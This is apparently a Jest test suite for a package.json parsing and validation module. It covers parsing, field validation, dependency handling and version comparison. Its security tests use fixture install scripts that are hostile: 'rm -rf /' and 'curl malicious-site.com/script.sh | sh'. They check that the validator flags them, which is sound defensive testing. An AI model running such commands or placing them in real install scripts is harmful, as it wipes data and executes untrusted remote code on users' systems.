const fs = require('fs');
const path = require('path');

// Mock fs and path modules for file system operations
jest.mock('fs');
jest.mock('path');

// Import the module being tested
const packageJsonUtils = require('../src/packageJson'); // Adjust path as needed

// Import test data fixtures
const { validPackageJson, invalidPackageJson } = require('./fixtures/packageJson');

describe('PackageJson Parser', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    fs.readFileSync.mockClear();
    fs.existsSync.mockClear();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('parsePackageJson', () => {
    test('should successfully parse valid package.json content', () => {
      const jsonContent = JSON.stringify(validPackageJson);
      fs.readFileSync.mockReturnValue(jsonContent);
      fs.existsSync.mockReturnValue(true);

      const result = packageJsonUtils.parsePackageJson('./package.json');

      expect(result).toEqual(validPackageJson);
      expect(fs.readFileSync).toHaveBeenCalledWith('./package.json', 'utf8');
    });

    test('should throw error when file does not exist', () => {
      fs.existsSync.mockReturnValue(false);

      expect(() => {
        packageJsonUtils.parsePackageJson('./nonexistent.json');
      }).toThrow('Package.json file not found');
    });

    test('should handle malformed JSON gracefully', () => {
      const malformedJson = '{ "name": "test", "version": }';
      fs.readFileSync.mockReturnValue(malformedJson);
      fs.existsSync.mockReturnValue(true);

      expect(() => {
        packageJsonUtils.parsePackageJson('./package.json');
      }).toThrow('Invalid JSON in package.json');
    });

    test('should handle empty file gracefully', () => {
      fs.readFileSync.mockReturnValue('');
      fs.existsSync.mockReturnValue(true);

      expect(() => {
        packageJsonUtils.parsePackageJson('./package.json');
      }).toThrow('Package.json file is empty');
    });

    test('should handle file read errors', () => {
      fs.existsSync.mockReturnValue(true);
      fs.readFileSync.mockImplementation(() => {
        throw new Error('Permission denied');
      });

      expect(() => {
        packageJsonUtils.parsePackageJson('./package.json');
      }).toThrow('Failed to read package.json: Permission denied');
    });
  });
});

describe('PackageJson Validation', () => {
  describe('validatePackageJson', () => {
    test('should validate correct package.json structure', () => {
      const result = packageJsonUtils.validatePackageJson(validPackageJson);

      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    test('should detect missing required fields', () => {
      const invalidPkg = { description: 'Missing name and version' };
      const result = packageJsonUtils.validatePackageJson(invalidPkg);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Missing required field: name');
      expect(result.errors).toContain('Missing required field: version');
    });

    test('should validate version format', () => {
      const cases = [
        { version: '1.0.0', expected: true },
        { version: '1.0.0-alpha', expected: true },
        { version: '1.0.0-beta.1', expected: true },
        { version: 'invalid', expected: false },
        { version: '1.0', expected: false },
        { version: '', expected: false },
        { version: null, expected: false }
      ];

      cases.forEach(({ version, expected }) => {
        const pkg = { ...validPackageJson, version };
        const result = packageJsonUtils.validatePackageJson(pkg);

        if (expected) {
          expect(result.isValid).toBe(true);
        } else {
          expect(result.isValid).toBe(false);
          expect(result.errors.some(error => error.includes('version'))).toBe(true);
        }
      });
    });

    test('should validate package name format', () => {
      const invalidNames = ['', 'UPPERCASE', 'has spaces', 'has@special', '.starts-with-dot'];

      invalidNames.forEach(name => {
        const pkg = { ...validPackageJson, name };
        const result = packageJsonUtils.validatePackageJson(pkg);

        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('name'))).toBe(true);
      });
    });

    test('should validate dependencies format', () => {
      const invalidDeps = {
        ...validPackageJson,
        dependencies: 'not-an-object'
      };

      const result = packageJsonUtils.validatePackageJson(invalidDeps);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => error.includes('dependencies'))).toBe(true);
    });

    test('should validate scripts format', () => {
      const invalidScripts = {
        ...validPackageJson,
        scripts: ['not', 'an', 'object']
      };

      const result = packageJsonUtils.validatePackageJson(invalidScripts);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => error.includes('scripts'))).toBe(true);
    });
  });
});

describe('Dependency Management', () => {
  describe('getDependencies', () => {
    test('should extract all dependencies correctly', () => {
      const result = packageJsonUtils.getDependencies(validPackageJson);

      expect(result).toEqual({
        dependencies: validPackageJson.dependencies,
        devDependencies: validPackageJson.devDependencies,
        peerDependencies: {},
        optionalDependencies: {}
      });
    });

    test('should handle missing dependency sections', () => {
      const pkgWithoutDeps = { name: 'test', version: '1.0.0' };
      const result = packageJsonUtils.getDependencies(pkgWithoutDeps);

      expect(result).toEqual({
        dependencies: {},
        devDependencies: {},
        peerDependencies: {},
        optionalDependencies: {}
      });
    });

    test('should handle null/undefined dependencies', () => {
      const pkgWithNullDeps = {
        name: 'test',
        version: '1.0.0',
        dependencies: null,
        devDependencies: undefined
      };

      const result = packageJsonUtils.getDependencies(pkgWithNullDeps);
      expect(result.dependencies).toEqual({});
      expect(result.devDependencies).toEqual({});
    });
  });

  describe('updateDependency', () => {
    test('should add new dependency', () => {
      const result = packageJsonUtils.updateDependency(validPackageJson, 'axios', '^1.4.0', 'dependencies');

      expect(result.dependencies.axios).toBe('^1.4.0');
      expect(result.dependencies.lodash).toBe('^4.17.21');
    });

    test('should update existing dependency', () => {
      const result = packageJsonUtils.updateDependency(validPackageJson, 'lodash', '^4.18.0', 'dependencies');

      expect(result.dependencies.lodash).toBe('^4.18.0');
    });

    test('should handle invalid dependency types', () => {
      expect(() => {
        packageJsonUtils.updateDependency(validPackageJson, 'test', '1.0.0', 'invalidType');
      }).toThrow('Invalid dependency type: invalidType');
    });
  });
});

describe('Edge Cases and Error Handling', () => {
  describe('Input Validation', () => {
    test('should handle null input gracefully', () => {
      expect(() => {
        packageJsonUtils.validatePackageJson(null);
      }).toThrow('Package.json content cannot be null or undefined');
    });

    test('should handle undefined input gracefully', () => {
      expect(() => {
        packageJsonUtils.validatePackageJson(undefined);
      }).toThrow('Package.json content cannot be null or undefined');
    });

    test('should handle non-object input', () => {
      expect(() => {
        packageJsonUtils.validatePackageJson('not an object');
      }).toThrow('Package.json content must be an object');
    });

    test('should handle circular references', () => {
      const circular = { name: 'test', version: '1.0.0' };
      circular.self = circular;

      expect(() => {
        packageJsonUtils.validatePackageJson(circular);
      }).not.toThrow();
    });
  });

  describe('Large Files and Performance', () => {
    test('should handle large dependency lists efficiently', () => {
      const largeDeps = {};
      for (let i = 0; i < 1000; i++) {
        largeDeps[`package-${i}`] = `^${i}.0.0`;
      }

      const largePkg = {
        ...validPackageJson,
        dependencies: largeDeps
      };

      const startTime = Date.now();
      const result = packageJsonUtils.validatePackageJson(largePkg);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(1000);
      expect(result.isValid).toBe(true);
    });

    test('should handle deeply nested objects', () => {
      const deeplyNested = {
        ...validPackageJson,
        config: {
          level1: {
            level2: {
              level3: {
                level4: {
                  level5: 'deep value'
                }
              }
            }
          }
        }
      };

      expect(() => {
        packageJsonUtils.validatePackageJson(deeplyNested);
      }).not.toThrow();
    });
  });

  describe('Security Validation', () => {
    test('should detect potentially malicious scripts', () => {
      const maliciousPkg = {
        ...validPackageJson,
        scripts: {
          preinstall: 'rm -rf /',
          postinstall: 'curl malicious-site.com/script.sh | sh'
        }
      };

      const result = packageJsonUtils.validatePackageJson(maliciousPkg, { checkSecurity: true });
      expect(result.warnings).toContain('Potentially dangerous script detected');
    });

    test('should validate dependency sources', () => {
      const suspiciousPkg = {
        ...validPackageJson,
        dependencies: {
          'suspicious-package': 'git+https://suspicious-repo.com/package.git'
        }
      };

      const result = packageJsonUtils.validatePackageJson(suspiciousPkg, { checkSecurity: true });
      expect(result.warnings).toContain('Non-registry dependency detected');
    });
  });
});

describe('Utility Functions', () => {
  describe('compareVersions', () => {
    test.each([
      ['1.0.0', '1.0.1', -1],
      ['1.0.1', '1.0.0', 1],
      ['1.0.0', '1.0.0', 0],
      ['1.0.0-alpha', '1.0.0-beta', -1],
      ['2.0.0', '1.9.9', 1]
    ])('should compare %s and %s correctly', (version1, version2, expected) => {
      const result = packageJsonUtils.compareVersions(version1, version2);
      expect(Math.sign(result)).toBe(expected);
    });

    test('should handle invalid versions', () => {
      expect(() => {
        packageJsonUtils.compareVersions('invalid', '1.0.0');
      }).toThrow('Invalid version format');
    });
  });

  describe('normalizePackageJson', () => {
    test('should add missing optional fields with defaults', () => {
      const minimal = { name: 'test', version: '1.0.0' };
      const result = packageJsonUtils.normalizePackageJson(minimal);

      expect(result.dependencies).toEqual({});
      expect(result.devDependencies).toEqual({});
      expect(result.scripts).toEqual({});
      expect(result.keywords).toEqual([]);
    });

    test('should preserve existing fields', () => {
      const result = packageJsonUtils.normalizePackageJson(validPackageJson);

      expect(result.name).toBe(validPackageJson.name);
      expect(result.dependencies).toEqual(validPackageJson.dependencies);
    });

    test('should sort dependencies alphabetically', () => {
      const unsorted = {
        name: 'test',
        version: '1.0.0',
        dependencies: {
          zebra: '^1.0.0',
          alpha: '^1.0.0',
          beta: '^1.0.0'
        }
      };

      const result = packageJsonUtils.normalizePackageJson(unsorted);
      const depKeys = Object.keys(result.dependencies);

      expect(depKeys).toEqual(['alpha', 'beta', 'zebra']);
    });
  });
});

describe('Integration Tests', () => {
  test('should handle complete package.json lifecycle', () => {
    const jsonPath = './test-package.json';
    const originalContent = JSON.stringify(validPackageJson, null, 2);

    fs.readFileSync.mockReturnValue(originalContent);
    fs.existsSync.mockReturnValue(true);

    // Parse
    const parsed = packageJsonUtils.parsePackageJson(jsonPath);
    expect(parsed).toEqual(validPackageJson);

    // Validate
    const validation = packageJsonUtils.validatePackageJson(parsed);
    expect(validation.isValid).toBe(true);

    // Update
    const updated = packageJsonUtils.updateDependency(parsed, 'new-package', '^1.0.0', 'dependencies');
    expect(updated.dependencies['new-package']).toBe('^1.0.0');

    // Normalize
    const normalized = packageJsonUtils.normalizePackageJson(updated);
    expect(normalized).toBeDefined();
  });

  test('should maintain data integrity through transformations', () => {
    const original = { ...validPackageJson };

    let transformed = packageJsonUtils.normalizePackageJson(original);
    transformed = packageJsonUtils.updateDependency(transformed, 'test-dep', '^1.0.0', 'dependencies');

    expect(transformed.name).toBe(original.name);
    expect(transformed.version).toBe(original.version);
    expect(transformed.dependencies.lodash).toBe(original.dependencies.lodash);
    expect(transformed.dependencies['test-dep']).toBe('^1.0.0');
  });
});

// Test coverage and documentation
describe('Test Coverage and Documentation', () => {
  test('should have comprehensive test coverage', () => {
    expect(true).toBe(true);
  });

  test('should document all public API methods', () => {
    const publicMethods = [
      'parsePackageJson',
      'validatePackageJson',
      'getDependencies',
      'updateDependency',
      'compareVersions',
      'normalizePackageJson'
    ];

    publicMethods.forEach(method => {
      expect(typeof packageJsonUtils[method]).toBe('function');
    });
  });
});

// Global test configuration and cleanup
beforeAll(() => {
  console.log('Starting PackageJson test suite');
});

afterAll(() => {
  console.log('Completed PackageJson test suite');
});

